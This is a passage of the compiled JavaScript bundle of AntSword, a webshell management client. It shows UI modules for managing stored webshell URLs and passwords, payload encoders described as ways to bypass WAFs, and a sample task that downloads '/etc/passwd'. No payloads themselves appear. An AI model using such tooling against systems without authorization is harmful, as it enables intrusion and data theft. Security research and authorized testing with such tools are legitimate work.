	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 任务管理 模块
	//

	/*
	  用法：
	  const task = new Task('download', 'http://xx.com/path/to => /tmp/');
	  task.update('start download..');
	  task.update('100%');
	  task.end('download success!');
	*/

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['filemanager']['tasks'];

	var Tasks = function () {
	  function Tasks(cell, manager) {
	    _classCallCheck(this, Tasks);

	    cell.setText('<i class="fa fa-tasks"></i> ' + LANG['title']);
	    cell.setHeight(250);

	    // 创建表格
	    var grid = cell.attachGrid();

	    grid.setHeader('\n      ' + LANG['grid']['header']['name'] + ',\n      ' + LANG['grid']['header']['desc'] + ',\n      ' + LANG['grid']['header']['status'] + ',\n      ' + LANG['grid']['header']['stime'] + ',\n      ' + LANG['grid']['header']['etime'] + '\n    ');
	    grid.setColTypes("ro,ro,ro,ro,ro");
	    grid.setInitWidths("100,*,150,150,150");
	    grid.setColAlign("left,left,left,left,left");

	    grid.init();

	    this.grid = grid;
	    this.cell = cell;
	    this.manager = manager;
	  }

	  // const task = tasks.new('download', '/etc/passwd', '0%');
	  // task.update('20%');
	  // task.end('100%');


	  _createClass(Tasks, [{
	    key: 'new',
	    value: function _new(name, desc, progress) {
	      // 创建一个随机ID
	      var hash = String(+new Date() + Math.random()).replace('.', '_');
	      this.grid.addRow(hash, [name, desc, '<div id="filemanager_progress_' + hash + '">-</div>', new Date().format('yyyy-MM-dd hh:mm:ss'), '<div id="filemanager_end_time_' + hash + '">-</div>'], 0);
	      var API = {
	        // 更新任务状态
	        update: function update(progress) {
	          $('#filemanager_progress_' + hash).text(progress);
	        },
	        // 任务结束
	        end: function end(progress) {
	          $('#filemanager_progress_' + hash).text(progress || '100%');
	          $('#filemanager_end_time_' + hash).text(new Date().format('yyyy-MM-dd hh:mm:ss'));
	        },
	        // 任务成功
	        success: function success(progress) {
	          API['end'](progress);
	          $('#filemanager_progress_' + hash).css('color', 'green');
	        },
	        // 任务失败
	        failed: function failed(progress) {
	          API['end'](progress);
	          $('#filemanager_progress_' + hash).css('color', 'red');
	        }
	      };
	      return API;
	    }
	  }]);

	  return Tasks;
	}();

	exports.default = Tasks;

/***/ },
/* 83 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 左侧目录 模块
	//

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['filemanager']['folder'];

	var Folder = function () {

	  // 需要参数
	  // 1.cell: 左侧layout.cell对象

	  function Folder(cell, manager) {
	    _classCallCheck(this, Folder);

	    cell.setWidth(250);
	    cell.setText('<i class="fa fa-folder-o"></i> ' + LANG['title']);
	    // 创建tree
	    var tree = cell.attachTree();
	    // tree事件
	    tree.attachEvent('onClick', function (id) {
	      manager.files.gotoPath(id);
	    });

	    this.tree = tree;
	    this.cell = cell;
	    this.cache = {};
	    this.manager = manager;
	  }

	  _createClass(Folder, [{
	    key: 'parse',
	    value: function parse(files) {

	      var self = this;
	      // 解析测试
	      var path = this.manager.path.replace(/\/$/, '');
	      // 解析盘符
	      this.manager.devices.map(function (_) {
	        self.cache[_] = {};
	        self.tree.deleteItem(_);
	      });
	      // 1. 分解当前路径
	      var curPath = '';
	      path.split('/').map(function (p) {
	        curPath += p + '/';
	        // 添加到缓存
	        self.cache[curPath] = 0;
	      });
	      // 2. 解析当前子目录
	      files.map(function (f) {
	        var _ = f['name'];
	        if (!_.endsWith('/') || ['./', '../'].indexOf(_) !== -1) {
	          return;
	        };
	        self.cache['' + curPath + _] = 0;
	      });

	      // 3. 解析缓存为树形菜单虚拟对象
	      // /var/www/html 根据/分割为数组，循环，相加，增加到虚拟缓存
	      var vscache = {};
	      var parseObj = function parseObj(o, p) {
	        var start = p.substr(0, p.indexOf('/')) + '/';
	        var end = p.substr(start.length);

	        o[start] = o[start] || {};
	        if (end.length > 0) {
	          parseObj(o[start], end);
	        }
	      };
	      for (var c in self.cache) {
	        parseObj(vscache, c);
	      }

	      // 解析为树形菜单数据
	      var parseItem = function parseItem(obj, path) {
	        var _arr = [];
	        for (var _ in obj) {
	          var _path = path + _;
	          var _obj = {
	            id: _path,
	            text: _.length === 1 || _.endsWith(':/') && _.length === 3 ? _ : _.replace(/\/$/, '')
	          };
	          var _result = parseItem(obj[_], _path);
	          if (_result) {
	            _obj['item'] = _result;
	          };
	          if (_path === self.manager.path) {
	            _obj['open'] = 1;
	            _obj['select'] = 1;
	          };
	          _arr.push(_obj);
	        }
	        return _arr;
	      };

	      var items = parseItem(vscache, '');

	      this.tree.parse({
	        id: 0,
	        item: items
	      }, 'json');

	      this.cell.progressOff();
	    }
	  }]);

	  return Folder;
	}();

	exports.default = Folder;

/***/ },
/* 84 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	//
	// 默认支持编码列表
	//

	var ENCODES = ['GBK', 'UTF8', 'BIG5', 'GB2312', 'Euc-KR', 'Euc-JP', 'Shift_JIS', 'ISO-8859-1', 'Windows-874', 'Windows-1251'];
	exports.default = ENCODES;

/***/ },
/* 85 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 插件中心
	//

	var LANG = antSword['language']['plugin'];
	var LANG_T = antSword['language']['toastr'];

	var Plugin = function () {
	  function Plugin() {
	    _classCallCheck(this, Plugin);

	    antSword['menubar'].reg('plugin', this.open.bind(this));
	    this.homepage = 'http://u.uyu.us/';
	  }

	  _createClass(Plugin, [{
	    key: 'open',
	    value: function open() {
	      var tabbar = antSword['tabbar'];
	      // 判断是否已经打开
	      if (tabbar.tabs('tab_plugin')) {
	        return tabbar.tabs('tab_plugin').setActive();
	      };
	      tabbar.addTab('tab_plugin', '<i class="fa fa-cart-arrow-down"></i>', null, null, true, true);
	      var cell = tabbar.tabs('tab_plugin');
	      //
	      // @创建浏览器工具栏:后退、前进、刷新、主页、停止
	      //
	      var toolbar = cell.attachToolbar();
	      toolbar.loadStruct([{ id: 'back', type: 'button', text: '', icon: 'chevron-left' }, { id: 'forward', type: 'button', text: '', icon: 'chevron-right' }, { id: 'refresh', type: 'button', text: '', icon: 'refresh' }, { id: 'home', type: 'button', text: '', icon: 'home' }, { id: 'stop', type: 'button', text: '', icon: 'remove' }]);

	      // 开始加载web
	      cell.progressOn();
	      var frame = cell.attachURI(this.homepage);
	      frame.addEventListener('did-start-loading', cell.progressOn.bind(cell));
	      frame.addEventListener('did-finish-load', cell.progressOff.bind(cell));
	      frame.addEventListener('did-fail-load', function (err) {
	        cell.progressOff();
	        // cell.close();
	        var err_msg = 'Code: ' + err['errorCode'];
	        err_msg += err['errorDescription'] ? '<br/>Desc: ' + err['errorDescription'] : '';
	        return toastr.error(LANG['error'](err_msg), LANG_T['error']);
	      });

	      // 工具栏点击事件
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'back':
	            frame.goBack();
	            break;
	          case 'forward':
	            frame.goForward();
	            break;
	          case 'refresh':
	            frame.reloadIgnoringCache();
	            break;
	          case 'home':
	            frame.goToIndex(0);
	            break;
	          case 'stop':
	            frame.stop();
	            break;
	        }
	      });
	    }
	  }]);

	  return Plugin;
	}();

	exports.default = Plugin;

/***/ },
/* 86 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); //
	// 设置模块
	//

	var _about = __webpack_require__(87);

	var _about2 = _interopRequireDefault(_about);

	var _update = __webpack_require__(88);

	var _update2 = _interopRequireDefault(_update);

	var _language = __webpack_require__(89);

	var _language2 = _interopRequireDefault(_language);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var Settings = function () {
	  function Settings() {
	    var _this = this;

	    _classCallCheck(this, Settings);

	    antSword['menubar'].reg('settings', this.open.bind(this));
	    ['about', 'update', 'language'].map(function (_) {
	      antSword['menubar'].reg('settings-' + _, _this.setActive.bind(_this, _));
	    });
	  }

	  _createClass(Settings, [{
	    key: 'open',
	    value: function open() {
	      var tabbar = antSword['tabbar'];
	      // 判断是否已经打开
	      if (tabbar.tabs('tab_about')) {
	        return tabbar.tabs('tab_about').setActive();
	      };
	      tabbar.addTab('tab_about', '<i class="fa fa-cog"></i>', null, null, true, true);
	      var cell = tabbar.tabs('tab_about');

	      var sidebar = cell.attachSidebar({
	        template: 'text',
	        width: 200
	      });
	      new _about2.default(sidebar);
	      new _language2.default(sidebar);
	      new _update2.default(sidebar);

	      this.cell = cell;
	      this.sidebar = sidebar;
	    }

	    // @设置当前激活项

	  }, {
	    key: 'setActive',
	    value: function setActive(id) {
	      this.open();
	      this.sidebar.items(id).setActive();
	    }
	  }]);

	  return Settings;
	}();

	exports.default = Settings;

/***/ },
/* 87 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var LANG = antSword['language']['settings'];

	var About = function About(sidebar) {
	  _classCallCheck(this, About);

	  sidebar.addItem({
	    id: 'about',
	    selected: true,
	    text: '<i class="fa fa-heart-o"></i> ' + LANG['about']['title']
	  });
	  var cell = sidebar.cells('about');
	  cell.attachHTMLString('\n      <div align="center">\n        <img src="../static/imgs/logo.png" style="width: 30%;-webkit-user-select: none;" />\n      </div>\n      <div style="padding: 10px; font-family: sans-serif;text-indent: 2em;">\n        <p><strong>中国蚁剑是一款开源的网站管理工具，它主要面向于合法授权的渗透测试网络安全爱好者以及常规的网站操作管理人员，任何人不得用于非法用途以及盈利目的，否则后果自行承担。</strong></p>\n        <p>中国蚁剑采用Electron作为外壳，ES6作为前端框架语言。完全模块化的代码架构，让你轻易地对各种功能进行最大化自由的修改添加。目前支持三大主流操作系统：windows、linux、osx，支持三大主流网站脚本：php、asp、aspx，以及自定义数据格式的custom脚本。除此之外，你可以参考代码轻易地修改添加支持脚本类型，还可以编写编码模块对源数据进行编码加密等处理操作，以绕过各种WAF以及保护自己的数据安全。</p>\n        <p>当前支持三大主模块功能：文件管理、数据库管理、虚拟终端操作，以及正在开发中的插件管理功能，完全满足你的需求。<strong>目前脚本代码均来源于伟大的中国菜刀，本人只是进行了解密以及一些改动。在此向中国菜刀致敬！</strong></p>\n        <hr style="border:0;width:95%;border-bottom: solid 1px #CCC;" />\n        <ul style="list-style-type: none;padding: 0;margin: 0;">\n          <li><strong>微博：</strong>http://weibo.com/antoor</li>\n          <li><strong>交流群：</strong>130993112</li>\n      </div>\n    ');
	};

	exports.default = About;

/***/ },
/* 88 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 检查更新
	//

	var LANG = antSword['language']['settings']['update'];

	var Update = function Update(sidebar) {
	  _classCallCheck(this, Update);

	  sidebar.addItem({
	    id: 'update',
	    text: '<i class="fa fa-cloud-download"></i> ' + LANG['title']
	  });
	  var cell = sidebar.cells('update');

	  // toolbar
	  var toolbar = cell.attachToolbar();
	  toolbar.loadStruct([{ id: 'check', type: 'button', text: LANG['toolbar']['check'], disabled: true, icon: 'check-square-o' }, { type: 'separator' }]);

	  // status
	  cell.attachHTMLString('\n\n      当前版本：1.0.0\n      <br/>\n      暂不支持在线更新！\n      <br />\n      请访问<strong style="color:#0099FF">https://github.com/antoor/antSword</strong>获取最新版本！\n    ');
	};

	exports.default = Update;

/***/ },
/* 89 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 语言设置
	//

	var LANG = antSword['language']['settings']['language'];
	var LANG_T = antSword['language']['toastr'];

	var Language = function Language(sidebar) {
	  _classCallCheck(this, Language);

	  sidebar.addItem({
	    id: 'language',
	    text: '<i class="fa fa-language"></i> ' + LANG['title']
	  });
	  var cell = sidebar.cells('language');

	  // 工具栏
	  var toolbar = cell.attachToolbar();
	  toolbar.loadStruct([{ id: 'save', type: 'button', text: LANG['toolbar']['save'], icon: 'save' }, { type: 'separator' }]);

	  // 表单
	  var _language = localStorage.getItem('language') || 'en';
	  var form = cell.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 100, inputWidth: 150 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'combo', label: LANG['form']['label'], readonly: true, name: 'language', options: [{ text: LANG['form']['zh'], value: 'zh', selected: _language === 'zh' }, { text: LANG['form']['en'], value: 'en', selected: _language === 'en' }] }] }], true);

	  // 工具栏点击事件
	  toolbar.attachEvent('onClick', function (id) {
	    switch (id) {
	      case 'save':
	        var language = form.getValues()['language'];
	        // 保存设置
	        localStorage.setItem('language', language);
	        toastr.success(LANG['success'], LANG_T['success']);
	        // 重启应用
	        layer.confirm(LANG['confirm']['content'], {
	          icon: 2, shift: 6,
	          title: LANG['confirm']['title']
	        }, function (_) {
	          location.reload();
	        });
	        break;
	    }
	  });
	};

	exports.default = Language;

/***/ },
/* 90 */
/***/ function(module, exports, __webpack_require__) {

	//
	// Shell管理模块
	//

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	var _list = __webpack_require__(91);

	var _list2 = _interopRequireDefault(_list);

	var _category = __webpack_require__(93);

	var _category2 = _interopRequireDefault(_category);

	var _encodes = __webpack_require__(84);

	var _encodes2 = _interopRequireDefault(_encodes);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['shellmanager'];

	var ShellManager = function () {
	  function ShellManager() {
	    _classCallCheck(this, ShellManager);

	    // 初始化tabbar
	    var tabbar = antSword['tabbar'];
	    tabbar.addTab('tab_shellmanager',
	    // `<i class="fa fa-list-ul"></i> ${LANG['title']}`,
	    '<i class="fa fa-th-large"></i>', null, null, true, false);

	    var cell = tabbar.cells('tab_shellmanager');
	    var layout = cell.attachLayout('2U');

	    // 初始化左侧::列表管理
	    this.list = new _list2.default(layout.cells('a'), this);

	    // 初始化右侧::目录管理
	    this.category = new _category2.default(layout.cells('b'), this);

	    this.cell = cell;
	    this.win = new dhtmlXWindows();
	    this.win.attachViewportTo(cell.cell);

	    // 监听菜单栏消息
	    antSword['menubar'].reg('shell-add', this.addData.bind(this));

	    this.loadData();
	  }
	  // 清空缓存


	  _createClass(ShellManager, [{
	    key: 'clearCache',
	    value: function clearCache(id) {
	      layer.confirm(LANG['list']['clearCache']['confirm'], {
	        icon: 2, shift: 6,
	        title: '<i class="fa fa-trash"></i> ' + LANG['list']['clearCache']['title']
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('cache-clear', {
	          id: id
	        });
	        if (ret === true) {
	          toastr.success(LANG['list']['clearCache']['success'], LANG_T['success']);
	        } else {
	          toastr.error(LANG['list']['clearCache']['error'](ret['errno'] === -2 ? 'Not cache file.' : ret['errno']), LANG_T['error']);
	        }
	      });
	    }

	    // 清空所有缓存

	  }, {
	    key: 'clearAllCache',
	    value: function clearAllCache() {
	      layer.confirm(LANG['list']['clearAllCache']['confirm'], {
	        icon: 2, shift: 6,
	        title: '<i class="fa fa-trash"></i> ' + LANG['list']['clearAllCache']['title']
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('cache-clearAll');
	        if (ret === true) {
	          toastr.success(LANG['list']['clearAllCache']['success'], LANG_T['success']);
	        } else {
	          toastr.error(LANG['list']['clearAllCache']['error'](ret), LANG_T['error']);
	        }
	      });
	    }

	    // 添加数据

	  }, {
	    key: 'addData',
	    value: function addData() {
	      var _this = this;

	      // 判断当前tab是否在主页
	      if (antSword['tabbar'].getActiveTab() !== 'tab_shellmanager') {
	        this.cell.setActive();
	      };
	      // 初始化窗口
	      var win = this.createWin({
	        title: LANG['list']['add']['title'],
	        width: 450,
	        height: 350
	      });
	      win.denyResize();
	      // 工具栏
	      var toolbar = win.attachToolbar();
	      toolbar.loadStruct([{
	        id: 'add',
	        type: 'button',
	        icon: 'plus-circle',
	        text: LANG['list']['add']['toolbar']['add']
	      }, {
	        type: 'separator'
	      }, {
	        id: 'clear',
	        type: 'button',
	        icon: 'remove',
	        text: LANG['list']['add']['toolbar']['clear']
	      }]);
	      // 表单对象
	      var form = win.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 80, inputWidth: 250 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'input', label: LANG['list']['add']['form']['url'], name: 'url', required: true }, { type: 'input', label: LANG['list']['add']['form']['pwd'], name: 'pwd', required: true }, { type: 'combo', label: LANG['list']['add']['form']['encode'], readonly: true, name: 'encode', options: function () {
	            var ret = [];
	            _encodes2.default.map(function (_) {
	              ret.push({
	                text: _,
	                value: _,
	                selected: _ === 'UTF8'
	              });
	            });
	            return ret;
	          }() }, { type: 'combo', label: LANG['list']['add']['form']['type'], name: 'type', readonly: true, options: function () {
	            var ret = [];
	            [{ name: 'php', encoder: ['base64', 'chr'] }, { name: 'asp', encoder: [] }, { name: 'aspx', encoder: [] },
	            // { name: 'jsp', encoder: [] },
	            // { name: 'py', encoder: [] },
	            // { name: 'cfm', encoder: [] },
	            // { name: 'nodejs', encoder: ['base64', 'aes', 'urlencode'] },
	            { name: 'custom', encoder: ['base64', 'hex'] }].map(function (_) {
	              var obj = {
	                text: _['name'].toUpperCase(),
	                value: _['name'],
	                selected: _['name'] === 'php',
	                list: [{ type: 'settings', position: 'label-right', offsetLeft: 60, labelWidth: 100 }, { type: 'label', label: LANG['list']['add']['form']['encoder'] }, { type: 'radio', name: 'encoder_' + _['name'], value: 'default', label: 'default', checked: true }]
	              };
	              // 编码器对象
	              _['encoder'].map(function (e) {
	                obj['list'].push({
	                  type: 'radio',
	                  name: 'encoder_' + _['name'],
	                  value: e,
	                  label: e
	                });
	              });
	              ret.push(obj);
	            });
	            return ret;
	          }() }] }], true);

	      // toolbar点击
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'add':
	            // 添加数据
	            // 判断表单数据
	            if (!form.validate()) {
	              return toastr.warning(LANG['list']['add']['warning'], LANG_T['warning']);
	            };
	            // 解析数据
	            var data = form.getValues();
	            win.progressOn();
	            // 获取编码器
	            data['encoder'] = data['encoder_' + data['type']] ? data['encoder_' + data['type']] : '';
	            // 获取分类
	            data['category'] = _this.category['sidebar'].getActiveItem() || 'default';
	            var ret = antSword['ipcRenderer'].sendSync('shell-add', data);
	            // 更新UI
	            win.progressOff();
	            if (ret instanceof Object) {
	              win.close();
	              toastr.success(LANG['list']['add']['success'], LANG_T['success']);
	              _this.loadData({
	                category: data['category']
	              });
	            } else {
	              toastr.error(LANG['list']['add']['error'](ret.toString()), LANG_T['error']);
	            }
	            break;
	          case 'clear':
	            // 清空表单
	            form.clear();
	            break;
	        }
	      });
	    }

	    // 编辑数据

	  }, {
	    key: 'editData',
	    value: function editData(sid) {
	      var _this2 = this;

	      // 获取数据
	      // const data = antSword['ipcRenderer'].sendSync('shell-find', {
	      //   _id: sid
	      // })[0];
	      var data = antSword['ipcRenderer'].sendSync('shell-findOne', sid);

	      // 初始化窗口
	      var win = this.createWin({
	        title: LANG['list']['edit']['title'](data['url']),
	        width: 450,
	        height: 350
	      });
	      win.setModal(true);
	      win.denyResize();
	      // 工具栏
	      var toolbar = win.attachToolbar();
	      toolbar.loadStruct([{
	        id: 'save',
	        type: 'button',
	        icon: 'save',
	        text: LANG['list']['edit']['toolbar']['save']
	      }, {
	        type: 'separator'
	      }, {
	        id: 'clear',
	        type: 'button',
	        icon: 'remove',
	        text: LANG['list']['edit']['toolbar']['clear']
	      }]);
	      // 表单对象
	      var form = win.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 80, inputWidth: 250 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'input', label: LANG['list']['edit']['form']['url'], name: 'url', required: true, value: data['url'] }, { type: 'password', label: LANG['list']['edit']['form']['pwd'], name: 'pwd', required: true, value: data['pwd'] }, { type: 'combo', label: LANG['list']['edit']['form']['encode'], readonly: true, name: 'encode', options: function () {
	            var ret = [];
	            _encodes2.default.map(function (_) {
	              ret.push({
	                text: _,
	                value: _,
	                selected: _ === data['encode']
	              });
	            });
	            return ret;
	          }() }, { type: 'combo', label: LANG['list']['edit']['form']['type'], name: 'type', readonly: true, options: function () {
	            var ret = [];
	            [{ name: 'php', encoder: ['base64', 'chr'] }, { name: 'asp', encoder: [] }, { name: 'aspx', encoder: [] }, { name: 'custom', encoder: ['base64', 'hex'] }].map(function (_) {
	              var obj = {
	                text: _['name'].toUpperCase(),
	                value: _['name'],
	                selected: data['type'] === _['name'],
	                list: [{ type: 'settings', position: 'label-right', offsetLeft: 60, labelWidth: 100 }, { type: 'label', label: LANG['list']['edit']['form']['encoder'] }, { type: 'radio', name: 'encoder_' + _['name'], value: 'default', label: 'default', checked: data['encoder'] === 'default' || _['name'] !== data['type'] || !_['encoder'].indexOf(data['encoder']) }]
	              };
	              // 编码器对象
	              _['encoder'].map(function (e) {
	                obj['list'].push({
	                  type: 'radio',
	                  name: 'encoder_' + _['name'],
	                  value: e,
	                  label: e,
	                  checked: data['encoder'] === e
	                });
	              });
	              ret.push(obj);
	            });
	            return ret;
	          }() }] }], true);

	      // toolbar点击
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'save':
	            // 添加数据
	            // 判断表单数据
	            if (!form.validate()) {
	              return toastr.warning(LANG['list']['edit']['warning'], LANG_T['warning']);
	            };
	            // 解析数据
	            var data = form.getValues();
	            data['_id'] = sid;
	            win.progressOn();
	            // 获取编码器
	            data['encoder'] = data['encoder_' + data['type']] ? data['encoder_' + data['type']] : '';
	            // 获取分类
	            data['category'] = _this2.category['sidebar'].getActiveItem() || 'default';
	            var ret = antSword['ipcRenderer'].sendSync('shell-edit', data);
	            // 更新UI
	            win.progressOff();
	            if (typeof ret === 'number') {
	              win.close();
	              toastr.success(LANG['list']['edit']['success'], LANG_T['success']);
	              _this2.loadData({
	                category: data['category']
	              });
	            } else {
	              toastr.error(LANG['list']['edit']['error'](ret.toString()), LANG_T['error']);
	            }
	            break;
	          case 'clear':
	            // 清空表单
	            form.clear();
	            break;
	        }
	      });
	    }

	    // 删除数据

	  }, {
	    key: 'delData',
	    value: function delData(ids) {
	      var _this3 = this;

	      layer.confirm(LANG['list']['del']['confirm'](ids.length), {
	        icon: 2, shift: 6,
	        title: '<i class="fa fa-trash"></i> ' + LANG['list']['del']['title']
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('shell-del', ids);
	        if (typeof ret === 'number') {
	          toastr.success(LANG['list']['del']['success'](ret), LANG_T['success']);
	          // 更新UI
	          _this3.loadData({
	            category: _this3.category['sidebar'].getActiveItem() || 'default'
	          });
	        } else {
	          toastr.error(LANG['list']['del']['error'](ret.toString()), LANG_T['error']);
	        }
	      });
	    }

	    // 搜索数据

	  }, {
	    key: 'searchData',
	    value: function searchData() {
	      // 判断当前tab是否在主页
	      if (antSword['tabbar'].getActiveTab() !== 'tab_shellmanager') {
	        this.cell.setActive();
	      };
	      var category = this.category['sidebar'].getActiveItem() || 'default';
	      // 初始化窗口
	      var win = this.createWin({
	        title: '搜索数据 //' + category,
	        width: 450,
	        height: 350
	      });
	    }

	    // 加载数据

	  }, {
	    key: 'loadData',
	    value: function loadData(arg) {
	      // 获取当前分类
	      // const _category = this.category.sidebar.getActiveItem() || 'default';
	      // 根据分类查询数据
	      var ret = antSword['ipcRenderer'].sendSync('shell-find', arg || {});
	      var category = {};
	      // 解析数据
	      var data = [];
	      ret.map(function (_) {
	        category[_['category'] || 'default'] = category[_['category'] || 'default'] || 0;
	        category[_['category'] || 'default']++;
	        if (arg instanceof Object && arg['category'] && arg['category'] !== _['category']) {
	          return;
	        };
	        if (!arg && _['category'] !== 'default') {
	          return;
	        };
	        data.push({
	          id: _['_id'],
	          // pwd: _['pwd'],
	          // type: _['type'],
	          // encode: _['encode'] || 'utf8',
	          // encoder: _['encoder'] || 'default',
	          data: [_['url'], _['ip'], _['addr'], new Date(_['ctime']).format('yyyy/MM/dd hh:mm:ss'), new Date(_['utime']).format('yyyy/MM/dd hh:mm:ss')]
	        });
	      });
	      // 刷新UI::左侧数据
	      this.list.grid.clearAll();
	      this.list.grid.parse({
	        'rows': data
	      }, 'json');
	      // 刷新UI::右侧目录
	      if (arg instanceof Object && arg['category'] && !category[arg['category']]) {
	        category[arg['category']] = 0;
	      };
	      if (_typeof(category['default']) === 'object') {
	        category['default'] = 0;
	      };
	      // 1. 判断目录是否存在？更新目录bubble：添加目录
	      for (var c in category) {
	        // 添加category
	        if (!this.category['sidebar'].items(c)) {
	          this.category['sidebar'].addItem({
	            id: c,
	            bubble: category[c],
	            // selected: true,
	            text: '<i class="fa fa-folder-o"></i> ' + c
	          });
	        } else {
	          this.category['sidebar'].items(c).setBubble(category[c]);
	        }
	      }
	      // 2. 选中默认分类
	      this.category['sidebar'].items((arg || {})['category'] || 'default').setActive();
	      // 3. 更新标题
	      this.list.updateTitle(data.length);
	      this.category.updateTitle();
	    }

	    // 创建窗口

	  }, {
	    key: 'createWin',
	    value: function createWin(opts) {
	      var _id = String(Math.random()).substr(5, 10);
	      // 默认配置
	      var opt = $.extend({
	        title: 'Window:' + _id,
	        width: 550,
	        height: 450
	      }, opts);

	      // 创建窗口
	      var _win = this.win.createWindow(_id, 0, 0, opt['width'], opt['height']);
	      _win.setText(opt['title']);
	      _win.centerOnScreen();
	      _win.button('minmax').show();
	      _win.button('minmax').enable();

	      // 返回窗口对象
	      return _win;
	    }
	  }]);

	  return ShellManager;
	}();

	exports.default = ShellManager;

/***/ },
/* 91 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); //
	// 左侧shell数据管理模块
	//

	// import Db from '../../database/';


	var _terminal = __webpack_require__(92);

	var _terminal2 = _interopRequireDefault(_terminal);

	var _database = __webpack_require__(77);

	var _database2 = _interopRequireDefault(_database);

	var _filemanager = __webpack_require__(80);

	var _filemanager2 = _interopRequireDefault(_filemanager);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

